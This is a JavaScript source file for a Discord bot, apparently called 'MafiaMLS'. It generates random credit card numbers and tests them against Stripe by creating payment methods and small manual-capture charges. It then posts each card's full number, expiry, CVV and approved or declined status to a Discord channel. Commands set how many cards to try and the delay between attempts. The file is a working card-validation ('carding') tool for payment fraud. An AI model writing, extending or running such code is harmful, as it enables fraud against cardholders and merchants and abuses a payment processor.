
require('dotenv').config();

const { gerarCartaoAleatorio } = require('./gerador-cartoes');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const { Client, GatewayIntentBits, AttachmentBuilder, EmbedBuilder } = require('discord.js');
const fs = require('fs');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

let discordReady = false;
let modoMinimalista = false;
let isRunning = false;
let quantidadeTotal = 10;
let delaySegundos = 3.5;

// Variáveis de controle do loop
let testeAtual = 0;
let quantidadeRestante = 0;

client.once('ready', () => {
  console.log(`✅ Bot online: ${client.user.tag}`);
  discordReady = true;
});

// ==================== HANDLER DE COMANDOS ====================
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('c!')) return;

  const args = message.content.slice(2).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // c!help
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setColor("Blue")
      .setTitle("📜 Comandos Disponíveis - MafiaMLS")
      .setDescription("Aqui estão todos os comandos:")
      .addFields(
        { name: "🔧 **Gerais**", value: 
          "`c!help` → Mostra esta mensagem\n" +
          "`c!mode` → Ativa/Desativa Modo Minimalista" },
        { name: "⚙️ **Configuração**", value: 
          "`c!mont <número>` → Define quantos cartões testar\n" +
          "`c!wait <segundos>` → Define delay entre testes" },
        { name: "🚀 **Controle**", value: 
          "`c!start` → Inicia os testes\n" +
          "`c!stop` → Para os testes\n" +
          "`c!continue` → Continua os testes" }
      )
      .setFooter({ text: "Prefixo: c!" });

    return message.reply({ embeds: [embed] });
  }

  // c!mode
  if (command === 'mode') {
    modoMinimalista = !modoMinimalista;
    await message.reply(`**Modo Minimalista:** ${modoMinimalista ? '🟢 ATIVADO' : '🔴 DESATIVADO'}`);
  }

  // c!mont
  else if (command === 'mont') {
    const num = parseInt(args[0]);
    if (isNaN(num) || num < 1) return message.reply("❌ Use: `c!mont <número>`");
    quantidadeTotal = num;
    await message.reply(`✅ Quantidade definida para **${num}** cartões.`);
  }

  // c!start
  else if (command === 'start') {
    if (isRunning) return message.reply("⚠️ Já está rodando!");
    isRunning = true;
    testeAtual = 0;
    quantidadeRestante = quantidadeTotal;
    await message.reply(`🚀 **Iniciando testes!** (${quantidadeTotal} cartões)`);
    iniciarLoop(message.channel);
  }

  // c!stop
  else if (command === 'stop') {
    if (!isRunning) return message.reply("⚠️ Não está rodando.");
    isRunning = false;
    await message.reply("⛔ **Testes parados!** Use `c!continue` para continuar.");
  }

  // c!continue
  else if (command === 'continue') {
    if (isRunning) return message.reply("⚠️ Já está rodando.");
    if (quantidadeRestante <= 0) return message.reply("✅ Todos os testes já foram concluídos.");
    isRunning = true;
    await message.reply("▶️ **Continuando testes...**");
    iniciarLoop(message.channel);
  }

  // c!wait
  else if (command === 'wait') {
    const seg = parseFloat(args[0]);
    if (isNaN(seg) || seg < 1) return message.reply("❌ Use: `c!wait <segundos>`");
    delaySegundos = seg;
    await message.reply(`⏱️ Delay alterado para **${seg} segundos**.`);
  }
  else if (command == "ping") {
    await message.reply("Pong! :ping_pong: ")
  }
});

// ==================== LOOP DE TESTES ====================
async function iniciarLoop(channel) {
  while (isRunning && quantidadeRestante > 0) {
    testeAtual++;
    quantidadeRestante--;

    console.log(`🔄 Teste ${testeAtual}/${quantidadeTotal}`);

    const cartao = gerarCartaoAleatorio();
    await testarEEnviar(cartao, testeAtual, channel);

    if (isRunning && quantidadeRestante > 0) {
      await new Promise(r => setTimeout(r, delaySegundos * 1000));
    }
  }

  if (quantidadeRestante <= 0) {
    isRunning = false;
    channel.send("🎉 **Todos os testes foram concluídos!**");
  }
}

// ==================== FUNÇÃO PRINCIPAL DE TESTE ====================
async function testarEEnviar(cartao, numeroTeste, channel) {
  let resultado;
  let sucesso = false;

  try {
    const paymentMethod = await stripe.paymentMethods.create({
      type: 'card',
      card: {
        number: cartao.numero,
        exp_month: parseInt(cartao.mes),
        exp_year: parseInt(cartao.ano),
        cvc: cartao.cvv,
      },
    });

    const paymentIntent = await stripe.paymentIntents.create({
      amount: 100,
      currency: 'brl',
      payment_method: paymentMethod.id,
      confirm: true,
      capture_method: 'manual',
      automatic_payment_methods: { enabled: true, allow_redirects: 'never' }
    });

    resultado = { status: "✅ APROVADO", ...cartao, stripe_id: paymentIntent.id };
    sucesso = true;

  } catch (error) {
    resultado = { status: "❌ RECUSADO", ...cartao, motivo: error.raw?.message || error.message };
  }

  // Envio no Discord
  if (modoMinimalista && !sucesso) {
    await channel.send(`**Tentativa #${numeroTeste}** Não foi possível verificar o cartão (modo minimalista)`);
  } else {
    // Envio completo
    const embed = new EmbedBuilder()
      .setColor(sucesso ? "Green" : "Red")
      .setTitle(`Teste #${numeroTeste} - ${resultado.status}`)
      .addFields(
        { name: "Número", value: `\`${resultado.numero}\``, inline: true },
        { name: "Validade", value: `\`${resultado.validade || `${resultado.mes}/${resultado.ano}`}\``, inline: true },
        { name: "CVV", value: `\`${resultado.cvv}\``, inline: true },
        { name: "Bandeira", value: resultado.bandeira.toUpperCase(), inline: true }
      );

    if (resultado.motivo) embed.addFields({ name: "Motivo", value: resultado.motivo });

    const nomeArquivo = `cartao-${resultado.numero.slice(-4)}-${Date.now()}.json`;
    fs.writeFileSync(nomeArquivo, JSON.stringify(resultado, null, 2));

    const attachment = new AttachmentBuilder(nomeArquivo);

    await channel.send({ embeds: [embed], files: [attachment] });

    fs.unlinkSync(nomeArquivo);
  }
}

// ==================== INICIAR BOT ====================
client.login(process.env.DISCORD_TOKEN);